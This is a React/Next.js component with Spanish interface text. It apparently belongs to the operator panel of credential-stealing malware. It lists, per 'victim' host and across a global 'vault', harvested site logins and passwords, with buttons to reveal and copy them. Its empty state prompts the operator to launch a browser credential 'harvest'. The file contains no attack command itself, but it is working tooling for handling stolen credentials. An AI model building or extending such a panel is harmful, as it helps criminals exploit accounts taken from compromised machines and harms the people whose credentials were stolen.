'use client';
import { useState } from 'react';
import Link from 'next/link';
import { Copy, Eye, EyeOff, Search } from 'lucide-react';
import { toast } from 'sonner';
import { api } from '@/lib/api';
import { useApi } from '@/hooks/useApi';
import type { Credential } from '@/lib/types';
import { dateTime } from '@/lib/format';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Empty, ErrorState, SkeletonRows, Table, TD, TH, THead, TR } from '@/components/ui/table';
import { humanError } from '@/lib/errors';

const tone = (state: string) => state === 'found' ? 'ok' : state === 'empty' ? 'warn' : 'default';

export function CredentialTable({ victimId, global = false }: { victimId?: string; global?: boolean }) {
  const [q, setQ] = useState('');
  const [state, setState] = useState('');
  const [revealed, setRevealed] = useState<Record<string, string>>({});
  const path = global
    ? `/vault/credentials?q=${encodeURIComponent(q)}&state=${state}&limit=100`
    : `/victims/${victimId}/credentials?q=${encodeURIComponent(q)}&state=${state}&limit=100`;
  const rows = useApi<{ items: Credential[]; next: string | null }>(path);

  async function reveal(row: Credential): Promise<string | null> {
    try {
      const data = await api<{ value: string }>(`/vault/credentials/${row.id}/reveal`);
      setRevealed((current) => ({ ...current, [row.id]: data.value }));
      return data.value;
    } catch (error) {
      toast.error(humanError(error) || 'No se pudo revelar');
      return null;
    }
  }

  async function copyRow(row: Credential) {
    const value = revealed[row.id] ?? await reveal(row);
    if (!value) return;
    void navigator.clipboard.writeText(value);
    toast.success('Contraseña copiada');
  }

  const items = rows.data?.items ?? [];

  return (
    <div className="space-y-2">
      <div className="flex flex-wrap items-center gap-2">
        <div className="relative min-w-0 flex-1">
          <Search className="absolute left-2 top-2 h-3.5 w-3.5 text-muted" />
          <Input value={q} onChange={(event) => setQ(event.target.value)} placeholder="site o usuario" className="pl-7" aria-label="Buscar credenciales" />
        </div>
        <select value={state} onChange={(event) => setState(event.target.value)} className="h-8 rounded border border-line bg-bg px-2 text-xs" aria-label="Estado">
          <option value="">todos</option><option value="found">found</option><option value="empty">empty</option>
        </select>
        <Button size="sm" variant="secondary" onClick={rows.refresh}>refrescar</Button>
      </div>
      {rows.loading ? <SkeletonRows rows={8} cols={5} /> : rows.error ? <ErrorState message={rows.error.message} retry={rows.refresh} /> : items.length === 0 ? (
        <Empty title="Sin credenciales" hint="Pulsa Capturar credenciales en Resumen para lanzar un harvest de navegadores." />
      ) : (
        <Table className="table-sticky">
          <THead><TR><TH>site</TH><TH>usuario</TH><TH>contraseña</TH><TH>estado</TH><TH>origen</TH><TH>actualizado</TH></TR></THead>
          <tbody>
            {items.map((row) => (
              <TR key={row.id}>
                <TD className="max-w-[220px] truncate font-mono text-xs" title={row.url ?? undefined}>{row.url ?? '—'}</TD>
                <TD className="max-w-[160px] truncate font-mono text-xs">{row.username || '—'}</TD>
                <TD className="font-mono text-2xs">
                  {revealed[row.id] ?? row.passwordPreview ?? (row.hasPassword ? '••••••••' : '—')}
                  {row.hasPassword ? (
                    <span className="ml-1 inline-flex">
                      <Button size="icon" variant="ghost" aria-label="Ver contraseña" onClick={() => revealed[row.id] ? setRevealed((current) => { const next = { ...current }; delete next[row.id]; return next; }) : reveal(row)}>
                        {revealed[row.id] ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                      </Button>
                      <Button size="icon" variant="ghost" aria-label="Copiar contraseña" onClick={() => void copyRow(row)}><Copy className="h-3 w-3" /></Button>
                    </span>
                  ) : null}
                </TD>
                <TD><Badge tone={tone(row.state)}>{row.state}</Badge></TD>
                <TD className="max-w-[200px] truncate font-mono text-2xs text-muted" title={row.path}>{global && row.victim ? <Link href={`/victims?select=${row.victim.id}&tab=actividad`} className="text-brand">{row.victim.hostname}</Link> : row.kind}</TD>
                <TD className="num text-2xs text-muted">{dateTime(row.updatedAt)}</TD>
              </TR>
            ))}
          </tbody>
        </Table>
      )}
      {rows.data?.next ? <Button size="sm" variant="ghost" onClick={rows.refresh}>más antiguas</Button> : null}
    </div>
  );
}
